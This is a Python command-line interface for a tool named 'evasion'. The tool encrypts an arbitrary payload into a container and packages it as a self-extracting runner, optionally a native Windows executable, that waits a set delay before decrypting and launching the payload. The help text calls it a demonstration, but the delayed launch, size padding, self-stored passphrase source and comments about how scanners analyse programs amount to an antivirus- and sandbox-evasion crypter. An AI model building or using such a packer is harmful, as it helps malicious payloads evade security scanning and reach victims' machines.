"""Command-line interface for the evasion / HBX1 packaging tool."""

from __future__ import annotations

import argparse
import getpass
import json
import os
import sys
from pathlib import Path

from .args import positive_number
from .container import inspect_file, read_container_header
from .crypto import decrypt_file, encrypt_file
from .runner import (
    build_executable_from_source,
    build_runner_file,
    is_runner,
    read_runner_container,
)


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="evasion",
        description=(
            "Authenticated binary packaging demonstration. The tool encrypts a "
            "payload into an HBX1 container and can package it into a "
            "self-extracting runner that waits for a delay before recovering "
            "and launching the payload."
        ),
    )

    operation = parser.add_mutually_exclusive_group(required=True)
    operation.add_argument(
        "--encrypt",
        action="store_true",
        help="encrypt/package a file into an HBX1 container or runner",
    )
    operation.add_argument(
        "--decrypt",
        action="store_true",
        help="recover a file from an HBX1 container or runner",
    )
    operation.add_argument(
        "--inspect",
        action="store_true",
        help="inspect HBX1 metadata without decrypting",
    )

    parser.add_argument("source", type=Path, help="input file/container")
    parser.add_argument(
        "--output",
        type=Path,
        help="output file path. Required for --encrypt and --decrypt.",
    )
    parser.add_argument(
        "--add-size",
        type=positive_number,
        default=0.01,
        metavar="MB",
        help="additional size to add during encryption (default: 0.01 MB)",
    )
    parser.add_argument(
        "--delay",
        type=positive_number,
        default=101.0,
        metavar="SECONDS",
        help="recovery delay stored in the container (default: 101 seconds)",
    )
    parser.add_argument(
        "--mode",
        choices=("container", "runner"),
        default="runner",
        help=(
            "output format: 'runner' packages a self-extracting launcher that "
            "waits for the delay and then launches the payload; 'container' "
            "writes a plain .hbx file (default: runner)"
        ),
    )
    parser.add_argument(
        "--key",
        type=Path,
        help="AES key file used with --decrypt (generated automatically on encrypt)",
    )
    parser.add_argument(
        "--passphrase",
        help=(
            "passphrase protecting the container. The key is derived with "
            "PBKDF2-HMAC-SHA256. Prompted for when omitted."
        ),
    )
    parser.add_argument(
        "--passphrase-file",
        type=Path,
        help="read the passphrase from the first line of this file",
    )
    parser.add_argument(
        "--no-delay",
        action="store_true",
        help="skip the stored recovery delay (useful for controlled testing)",
    )
    parser.add_argument(
        "--build-exe",
        action="store_true",
        help=(
            "package the runner as a single native executable with PyInstaller "
            "(produces a .exe on Windows). Requires --mode runner."
        ),
    )
    parser.add_argument(
        "--no-native",
        action="store_true",
        help=(
            "do not build a native executable even when the output name ends "
            "in .exe. Without this flag, a .exe output is packaged into a "
            "real native program, because a script renamed to .exe is not "
            "executable on Windows and is not analysed as a program by a "
            "scanner."
        ),
    )

    return parser


def _read_passphrase(args: argparse.Namespace) -> tuple[str, dict]:
    """Resolve the passphrase and describe where the runner can find it.

    The returned source dictionary is stored in the container header so the
    generated runner can retrieve the passphrase the same way, without the
    user having to type it again.
    """

    if args.passphrase is not None:
        return args.passphrase, {}

    if args.passphrase_file is not None:
        if not args.passphrase_file.is_file():
            raise ValueError(
                f"passphrase file does not exist: {args.passphrase_file}"
            )
        passphrase = args.passphrase_file.read_text(
            encoding="utf-8"
        ).splitlines()[0]
        return passphrase, {"file": str(args.passphrase_file.resolve())}

    environment = os.environ.get("HBX_PASSPHRASE")
    if environment:
        return environment, {"env": "HBX_PASSPHRASE"}

    if not sys.stdin.isatty():
        raise ValueError(
            "no passphrase available: use --passphrase, --passphrase-file or "
            "set the HBX_PASSPHRASE environment variable"
        )

    return getpass.getpass("Passphrase: "), {"env": "HBX_PASSPHRASE"}


def _run_encrypt(parser: argparse.ArgumentParser, args: argparse.Namespace) -> int:
    if args.output is None:
        parser.error("--output is required with --encrypt")

    if args.build_exe and args.mode != "runner":
        parser.error("--build-exe requires --mode runner")

    original_size = args.source.stat().st_size

    if args.mode == "container":
        passphrase = None
        passphrase_source: dict = {}
        if args.passphrase or args.passphrase_file:
            passphrase, passphrase_source = _read_passphrase(args)

        key_path = encrypt_file(
            source=args.source,
            output=args.output,
            add_size_mb=args.add_size,
            delay=args.delay,
            passphrase=passphrase,
            passphrase_source=passphrase_source,
        )

        final_size = args.output.stat().st_size

        print("[OK] Encryption completed.")
        print(f"[INFO] Input:       {args.source}")
        print(f"[INFO] Container:   {args.output}")
        if key_path is not None:
            print(f"[INFO] Key:         {key_path}")
        print(f"[INFO] Original:    {original_size} bytes")
        print(f"[INFO] Container:   {final_size} bytes")
        print(f"[INFO] Added:       {final_size - original_size} bytes")
        print(f"[INFO] Delay:       {args.delay:g} second(s)")
        print("[INFO] The container is data only; nothing is executed.")
        return 0

    passphrase, passphrase_source = _read_passphrase(args)

    # A file named ".exe" that is really a script does not run on Windows
    # and is not analysed as a program by a scanner, so package a real
    # native executable by default in that case.
    wants_native = args.build_exe or (
        args.output.suffix.lower() == ".exe" and not args.no_native
    )

    if wants_native:
        build_executable_from_source(
            source=args.source,
            output=args.output,
            add_size_mb=args.add_size,
            delay=args.delay,
            passphrase=passphrase,
            passphrase_source=passphrase_source,
        )
        final_size = args.output.stat().st_size
        print("[OK] Encryption completed.")
        print(f"[INFO] Input:       {args.source}")
        print(f"[INFO] Executable:  {args.output}")
        print(f"[INFO] Original:    {original_size} bytes")
        print(f"[INFO] Executable:  {final_size} bytes")
        print(f"[INFO] Added:       {final_size - original_size} bytes")
        print(f"[INFO] Delay:       {args.delay:g} second(s)")
        print("[INFO] Run the executable to trigger the delayed recovery.")
        return 0

    build_runner_file(
        source=args.source,
        output=args.output,
        add_size_mb=args.add_size,
        delay=args.delay,
        passphrase=passphrase,
        passphrase_source=passphrase_source,
    )

    final_size = args.output.stat().st_size

    print("[OK] Encryption completed.")
    print(f"[INFO] Input:       {args.source}")
    print(f"[INFO] Runner:      {args.output}")
    print(f"[INFO] Original:    {original_size} bytes")
    print(f"[INFO] Runner:      {final_size} bytes")
    print(f"[INFO] Added:       {final_size - original_size} bytes")
    print(f"[INFO] Delay:       {args.delay:g} second(s)")
    print("[INFO] Run the runner to trigger the delayed recovery.")
    return 0


def _run_decrypt(parser: argparse.ArgumentParser, args: argparse.Namespace) -> int:
    if args.output is None:
        parser.error("--output is required with --decrypt")

    passphrase = None
    if args.passphrase or args.passphrase_file or os.environ.get("HBX_PASSPHRASE"):
        passphrase, _ = _read_passphrase(args)
    else:
        # Fall back to the source recorded in the container metadata, so a
        # runner can be recovered with the same passphrase it was built with.
        passphrase = _passphrase_from_metadata(args.source)

    decrypt_file(
        source=args.source,
        output=args.output,
        key_path=args.key,
        no_delay=args.no_delay,
        passphrase=passphrase,
    )

    print("[OK] Recovery completed.")
    print(f"[INFO] Recovered file: {args.output}")
    print("[INFO] The recovered file was written to disk but was NOT executed.")
    return 0


def _passphrase_from_metadata(source: Path) -> str | None:
    """Read the passphrase from the source recorded in the container header."""

    try:
        header = read_container_header(source)
    except (OSError, ValueError, EOFError):
        return None

    kdf = header.get("kdf")
    if not isinstance(kdf, dict):
        return None

    env_name = kdf.get("env")
    if env_name:
        value = os.environ.get(env_name)
        if value:
            return value

    file_name = kdf.get("file")
    if file_name:
        try:
            passphrase = Path(file_name).read_text(
                encoding="utf-8"
            ).splitlines()[0]
        except (OSError, IndexError):
            return None
        if passphrase:
            return passphrase

    return None


def _run_inspect(args: argparse.Namespace) -> int:
    if is_runner(args.source):
        header, ciphertext = read_runner_container(args.source)
        result = dict(header)
        result["artifact_type"] = "runner"
        result["container_ciphertext_bytes"] = len(ciphertext)
        result["artifact_size_bytes"] = args.source.stat().st_size
    else:
        result = inspect_file(args.source)
        result["artifact_type"] = "container"

    print(json.dumps(result, indent=2, sort_keys=True))
    return 0


def main(argv: list[str] | None = None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)

    try:
        if args.encrypt:
            return _run_encrypt(parser, args)
        if args.decrypt:
            return _run_decrypt(parser, args)
        if args.inspect:
            return _run_inspect(args)
        parser.error("no operation selected")
    except KeyboardInterrupt:
        print("\n[ERROR] Operation cancelled.", file=sys.stderr)
        return 130
    except (OSError, ValueError, EOFError) as exc:
        print(f"[ERROR] {exc}", file=sys.stderr)
        return 1
    except Exception as exc:  # noqa: BLE001 - top-level CLI guard
        print(f"[ERROR] Unexpected failure: {exc}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
